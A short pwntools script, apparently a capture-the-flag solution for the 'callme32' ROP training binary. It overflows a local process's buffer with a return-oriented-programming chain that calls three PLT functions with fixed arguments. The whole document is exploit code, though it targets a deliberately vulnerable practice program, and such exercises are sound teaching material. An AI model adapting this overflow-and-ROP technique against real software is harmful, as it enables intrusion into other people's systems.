from pwn import *

p = process("./callme32")
p.recvuntil("> ")
callme_one_plt_address = 0x080485C0
callme_two_plt_address = 0x08048620
callme_thress_plt_address = 0x080485B0
pop_pop_ret_address = 0x080488a9
payload = flat(["A"*(0x28+4), callme_one_plt_address, pop_pop_ret_address, 1, 2, 3, callme_two_plt_address, pop_pop_ret_address, 1, 2, 3, callme_thress_plt_address, pop_pop_ret_address, 1, 2, 3])
p.sendline(payload)
p.interactive()
